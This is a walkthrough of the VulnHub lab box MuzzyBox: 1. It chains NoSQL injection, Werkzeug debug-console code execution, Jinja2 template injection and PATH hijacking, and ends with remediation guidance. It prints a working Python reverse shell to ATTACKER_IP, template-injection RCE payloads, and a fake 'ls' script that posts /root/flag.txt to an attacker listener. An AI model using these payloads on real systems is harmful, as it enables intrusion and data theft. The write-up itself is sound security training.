# MuzzyBox: 1 — Three Challenges, One Box

Alright dudes, this one is different. MuzzyBox: 1 does not follow the traditional "one path to root" boot-to-root formula. It gives you three independent challenges (three flags), each testing a completely different attack class: NoSQL injection, Werkzeug debug console abuse, and Server-Side Template Injection (SSTI) chained with PATH hijacking. Wild variety, wild fun. The box even leaves breadcrumbs between challenges — the flag value from Challenge 1 contains the PIN for Challenge 2. That is some next-level interconnected CTF design. no cap, this one is underrated.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | MuzzyBox: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/muzzybox-1,552/ |
| **Techniques** | NoSQL injection ($ne operator bypass), Werkzeug debug console PIN exploitation, Python reverse shell via debug console, SSTI detection and exploitation (tplmap), SSH credential reuse, PATH hijacking privilege escalation |
| **CVEs** | CWE-943 (Improper Neutralization of Special Elements in Data Query Logic — NoSQL injection), CWE-94 (Improper Control of Code Generation — Werkzeug debug console RCE), CWE-74 (Improper Neutralization of Special Elements in Output Used by Downstream Component — SSTI), CWE-427 (Uncontrolled Search Path Element — PATH hijacking) |
| **APT Groups** | APT41 (Winnti Group): leverages exposed Werkzeug/Flask debug consoles discovered via Shodan as initial access in cloud-facing environments; FIN7: exploits NoSQL injection in modern web applications as part of initial access kill chains; OceanLotus (APT32): uses PATH hijacking and environment variable manipulation in post-exploitation Linux pivots |

---

## Attack Summary

```
netdiscover → nmap → ports 22, 80, 3000, 8989, 9633, 15000
  → port 80: index.txt → three challenge descriptions + hint "alternative of SQL DB"
  → port 9633: ID card template download
  → port 3000: Library app (MongoDB/NoSQL backend)
  → edit ID card: Name "Raj {$ne: 1}" → upload → NoSQL auth bypass
  → FLAG 1: N$ctF{D388uG_P!N_!$_123-456-789} → PIN = 123-456-789
  → port 8989: Werkzeug debug console (PIN-protected)
  → enter PIN 123-456-789 → Python console
  → Python reverse shell → shell as webssti user
  → FLAG 2: N$cTF{R34D_F!L3_/home/webssti/noflag.txt}
  → port 15000: Flask SSTI app
  → curl "...?name={{7*7}}" → 49 (SSTI confirmed)
  → tplmap -u "...?name=*" --os-shell → RCE
  → cat /home/webssti/ssti/no_flag.txt → SSH credentials
  → ssh <user>@TARGET
  → sudo -l → path writable early in $PATH
  → create malicious 'ls' in /usr/local/sbin → PATH hijack
  → root executes malicious ls → FLAG 3 exfiltrated
```

---

## Methodology

1. Full port scan and service fingerprinting
2. Challenge 1: NoSQL injection bypass on the library app (port 3000)
3. Challenge 2: Werkzeug debug console PIN abuse and Python reverse shell (port 8989)
4. Challenge 3: SSTI exploitation via tplmap on Flask app (port 15000)
5. SSH access using credentials from SSTI filesystem read
6. PATH hijacking for root flag exfiltration

---

## Step 1 — Reconnaissance: Full Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.6

nmap -sV -sC -A 192.168.1.6
```

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.x
80/tcp    open  http     Apache httpd (index.txt with challenge descriptions)
3000/tcp  open  http     Node.js/Express (Library application — Challenge 1)
8989/tcp  open  http     Werkzeug Python debug console (Challenge 2)
9633/tcp  open  http     Apache (ID card template download)
15000/tcp open  http     Flask SSTI application (Challenge 3)
```

Port 80 serves `index.txt` describing all three challenges. This is the map to the entire box. The hint: "The library app uses an alternative of SQL DB" — confirming the NoSQL backend.

**MITRE ATT&CK:** T1046 — Network Service Discovery; T1083 — File and Directory Discovery

---

## Step 2 — Challenge 1: NoSQL Injection (Port 3000)

The library application on port 3000 authenticates users via a NoSQL query. The ID card template provides the injection vector: the application processes field values from the uploaded card without sanitization.

**Download the ID card template from port 9633:**

```bash
wget http://192.168.1.6:9633/idcard.png
```

**Edit the ID card with a NoSQL injection payload:**

Open the downloaded `idcard.png` in an image editor (GIMP or similar). Modify the text fields:
- **Name:** `Raj {$ne: 1}`
- **Position:** `Principal`
- **Access Level:** `Authorized`

The `{$ne: 1}` MongoDB operator means "not equal to 1" — when inserted into a NoSQL query, it forces the condition to always evaluate to true, bypassing authentication entirely.

**Upload the modified card to the library app on port 3000.** The application processes the card fields, constructs a NoSQL query with the injected operator, and authenticates without valid credentials.

**Flag 1:** `N$ctF{D388uG_P!N_!$_123-456-789}`

The flag value itself contains the Werkzeug debug PIN: **123-456-789**. The flag is both a completion marker and a breadcrumb to Challenge 2.

**Why NoSQL injection works:** MongoDB operators like `$ne`, `$gt`, `$regex`, and `$where` allow query manipulation just as SQL operators do. When user input is directly embedded in a NoSQL query without sanitization, these operators can bypass authentication, exfiltrate data, or execute arbitrary JavaScript.

**Real-world note:** NoSQL injection is significantly underestimated. MongoDB is used by thousands of production applications — its JSON-based query format looks safe but contains powerful operators that become injection vectors when user input is not sanitized. FIN7 has demonstrated NoSQL injection as part of their web application attack arsenal.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1212 — Exploitation for Credential Access

---

## Step 3 — Challenge 2: Werkzeug Debug Console (Port 8989)

The Werkzeug error page on port 8989 exposes an interactive Python console. It is protected by the PIN found in Flag 1.

**Set up the netcat listener:**

```bash
nc -lvnp 5555
```

**In the browser, navigate to `http://192.168.1.6:8989`.** Enter the PIN `123-456-789` when prompted. The Werkzeug debug console unlocks.

**Execute a Python reverse shell in the console:**

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

A reverse shell connects as the web application user. Navigate to the flag:

```bash
ls
cd flag
cat ctf2.py
```

**Flag 2:** `N$cTF{R34D_F!L3_/home/webssti/noflag.txt}`

Flag 2 points to a file at `/home/webssti/noflag.txt` — this is the breadcrumb to Challenge 3.

**Why Werkzeug debug is catastrophic in production:** The Werkzeug debugger allows arbitrary Python execution in the context of the web application process. PIN protection is inadequate because the PIN is deterministically derived from system parameters (MAC address, /proc/self/cgroup, /etc/machine-id) that can often be obtained through other means. Never deploy Werkzeug in debug mode to a production or network-accessible environment.

**Real-world note:** APT41 and multiple other threat actors actively scan for exposed Werkzeug and Flask debug consoles via Shodan queries for `Werkzeug/` server headers with `debugger` in the response. These are immediate remote code execution vulnerabilities that require no exploitation skill.

**MITRE ATT&CK:** T1059.006 — Command and Scripting Interpreter: Python; T1190 — Exploit Public-Facing Application

---

## Step 4 — Challenge 3: SSTI on Port 15000

### 4a. Confirm SSTI

The Flask application on port 15000 renders a `name` parameter directly into a Jinja2 template. Test with the Jinja2 arithmetic injection payload:

```bash
curl "http://192.168.1.6:15000/page?name={{7*7}}"
# Response body should contain: 49
```

If the response contains `49` (not the literal string `{{7*7}}`), the template engine executed the payload. SSTI confirmed.

**Alternative confirmation:**

```bash
curl "http://192.168.1.6:15000/page?name={{config}}"
# Dumps Flask configuration including SECRET_KEY
```

### 4b. Exploit SSTI with tplmap

tplmap automates SSTI detection and exploitation across multiple template engines (Jinja2, Twig, Smarty, Mako, and more):

```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
python tplmap.py -u "http://192.168.1.6:15000/page?name=*" --os-shell
```

tplmap identifies the template engine (Jinja2/Flask) and provides an OS shell.

**Manual Jinja2 RCE payload (without tplmap):**

```python
# In the URL parameter:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# or: {{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('id')}}
```

### 4c. Read Credentials from the Filesystem

From the tplmap OS shell:

```bash
id
cat /home/webssti/ssti/no_flag.txt
# Contains SSH credentials
```

### 4d. SSH Access

```bash
ssh <user>@192.168.1.6
# Use credentials from no_flag.txt
```

**Why SSTI is as dangerous as RCE:** Server-Side Template Injection allows an attacker to inject template directives that execute on the server. In Jinja2 (Flask's default engine), SSTI provides direct access to Python objects, the OS module, and arbitrary command execution. SSTI is consistently rated Critical in web application security assessments.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.006 — Command and Scripting Interpreter: Python

---

## Step 5 — Privilege Escalation via PATH Hijacking

Check sudo rules and the execution environment:

```bash
sudo -l
echo $PATH
ls /usr/local/sbin
# /usr/local/sbin is writable and appears early in $PATH
```

A cron job or sudo rule runs `ls` as root. Since `/usr/local/sbin` is writable and appears before `/bin` in `$PATH`, a malicious `ls` binary placed there will execute instead of the real one.

**Create the malicious `ls` binary:**

```bash
cat > /usr/local/sbin/ls << 'EOF'
#!/bin/bash
cat /root/flag.txt | curl -X POST http://ATTACKER_IP:1234 -d @-
EOF
chmod +x /usr/local/sbin/ls
```

**Start a listener on the attacker to receive the exfiltrated flag:**

```bash
nc -lvnp 1234
```

When the root process executes `ls`, the malicious script runs, reading `/root/flag.txt` and POSTing it to the attacker's listener.

**Flag 3:** `N$CtF{8!NG000!!!__Y0U_D!D_!T_80!!!}`

**Why PATH hijacking works:** When a process executes a command without an absolute path (e.g., `ls` instead of `/bin/ls`), the OS searches `$PATH` directories in order for a matching executable. If an attacker-controlled directory appears early in the privileged process's `$PATH`, a malicious binary placed there intercepts the call. This is a trivial privilege escalation path in environments where any directory writable by a low-privilege user appears in a root process's `$PATH`.

**MITRE ATT&CK:** T1574.007 — Hijack Execution Flow: Path Interception by PATH Environment Variable

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Flag 1 | `N$ctF{D388uG_P!N_!$_123-456-789}` | Library app (port 3000) via NoSQL injection | Challenge 1 objective + Werkzeug PIN |
| Werkzeug PIN | 123-456-789 | Embedded in Flag 1 value | Unlock debug console (Challenge 2) |
| Flag 2 | `N$cTF{R34D_F!L3_/home/webssti/noflag.txt}` | /flag/ctf2.py via Werkzeug debug shell | Challenge 2 objective + SSTI breadcrumb |
| SSH credentials | (from /home/webssti/ssti/no_flag.txt) | SSTI filesystem read | SSH login |
| Flag 3 | `N$CtF{8!NG000!!!__Y0U_D!D_!T_80!!!}` | /root/flag.txt via PATH hijack | Challenge 3 objective |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | NoSQL injection ($ne operator) bypasses authentication | MongoDB `$ne`, `$gt`, `$regex` operators in unsanitized input bypass authentication and exfiltrate data exactly as SQL injection does | Sanitize and type-check all user input before embedding in NoSQL queries; use MongoDB's schema validation and query operators allowlist |
| 2 | Werkzeug debug console exposed in production | The Werkzeug debugger is immediate RCE; PIN protection is insufficient (PIN derivable from system params) | Never deploy Flask/Werkzeug with `debug=True` in production; use environment variable checks; monitor for Werkzeug server headers |
| 3 | SSTI provides arbitrary OS command execution | Jinja2 SSTI gives access to the entire Python object model; from there, OS commands are one attribute chain away | Never pass raw user input into template rendering calls; use a sandboxed template engine; validate and escape template inputs |
| 4 | FLAG values as breadcrumbs between challenges | In real breaches, attackers chain findings — a file read from one vulnerability provides credentials/hints for the next step | Treat every information disclosure finding as potentially enabling further exploitation; enumerate all accessible files after initial access |
| 5 | PATH hijacking in writable directory | World-writable directories early in a privileged process's $PATH are equivalent to SUID root on every binary with that name | Audit $PATH in all cron jobs and sudo contexts; remove world-writable directories from privileged $PATH; use absolute paths in privileged scripts |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application (NoSQL) | T1190 |
| Credential Access | Credential Access | Exploitation for Credential Access (NoSQL) | T1212 |
| Execution | Execution | Command and Scripting Interpreter: Python (Werkzeug) | T1059.006 |
| Initial Access | Initial Access | Exploit Public-Facing Application (SSTI) | T1190 |
| Lateral Movement | Lateral Movement | Valid Accounts (SSH with creds from SSTI) | T1078 |
| Privilege Escalation | Privilege Escalation | Hijack Execution Flow: PATH Interception | T1574.007 |

---

## Remediation and Containment

### Technical Fixes

1. **Sanitize NoSQL query inputs**: validate and type-check all user-supplied fields; use MongoDB's aggregation pipeline rather than direct operator injection; implement an input allowlist before constructing database queries
2. **Disable Werkzeug debug mode in production**: set `debug=False` in Flask; use environment variable guards: `app.run(debug=os.environ.get('FLASK_DEBUG', 'false').lower() == 'true')`; never expose Werkzeug on a network-accessible interface
3. **Prevent SSTI by escaping template inputs**: never pass raw user input to `render_template_string()` or similar; use Jinja2's autoescape; use a sandboxed Jinja2 environment for untrusted content
4. **Harden $PATH in privileged contexts**: use absolute paths in all cron jobs, sudo rules, and init scripts; audit all directories in privileged $PATH for world-writability: `ls -la $(echo $PATH | tr ':' '\n')`
5. **Implement network segmentation**: debug consoles (ports 8989, 3000) should never be accessible from untrusted networks; use firewall rules to restrict access by source IP or network segment

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening: disable debug mode; escape template inputs; sanitize NoSQL query parameters
- **D3-OAM** — Operating System Administrative Management: audit $PATH in privileged contexts; remove world-writable directories from privileged $PATH
- **D3-NTF** — Network Traffic Filtering: firewall rules restricting access to debug/development ports (3000, 8989, 15000)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all Flask/Node.js applications; identify debug-mode deployments; audit privileged $PATH |
| Protect | Access Control | Disable debug mode; firewall restrict debug ports; sanitize NoSQL inputs |
| Protect | Data Security | Escape all template inputs; prevent injection into NoSQL queries |
| Detect | Anomalies and Events | Alert on Werkzeug debug console access; alert on SSTI pattern strings in URL parameters; monitor for unexpected $PATH modifications |
| Respond | Response Planning | Disable debug endpoints; rotate credentials exposed via SSTI; patch NoSQL injection vulnerabilities |
| Recover | Recovery Planning | Rebuild affected services; audit all accounts and credentials |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| SI-10 | Information Input Validation | Sanitize NoSQL inputs; escape template parameters; validate ID card fields |
| CM-7 | Least Functionality | Disable Werkzeug debug mode in production; remove debug endpoints from production deployments |
| SC-7 | Boundary Protection | Firewall-restrict debug ports (3000, 8989, 15000) to trusted networks only |
| CM-6 | Configuration Settings | Enforce production configuration standards that prohibit debug mode |
| AC-6 | Least Privilege | Remove world-writable directories from privileged $PATH; audit cron job environments |
| IA-5 | Authenticator Management | Rotate all credentials exposed via SSTI filesystem read |

### CISA KEV

Server-Side Template Injection (SSTI) vulnerabilities in Flask/Jinja2 applications appear in multiple CISA advisories. CISA AA22-074A notes that threat actors exploit SSTI vulnerabilities as a first-stage remote code execution technique. The exposed Werkzeug debug console pattern is referenced in CISA guidance on securing Python web applications. Organizations should audit all Flask applications for debug mode and template injection vulnerabilities.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory (debug-mode applications) | MIL2 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments (NoSQL injection, SSTI, PATH hijack) | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges (privileged $PATH hardening) | MIL3 |

---

## Final Thoughts

MuzzyBox: 1 is a three-act play, and each act teaches something different. NoSQL injection says: "injection vulnerabilities don't care what database you use." Werkzeug debug console says: "debug tooling is RCE waiting to happen." SSTI says: "user input in template engines is command injection by another name."

The FLAG-as-breadcrumb design is brilliant. Finding the Werkzeug PIN inside the NoSQL injection flag is exactly the kind of chained thinking that real attackers use — and that defenders need to anticipate. When you find a credential or a file path in a CTF or a pentest, it's almost never the end of the story.

The three-challenge format makes MuzzyBox: 1 excellent for teams: split the challenges, race to flags, share findings. That is purple team spirit right there. no cap, one of the better-designed multi-flag boxes out there.

Thanks guys!! (❍ᴥ❍ʋ)
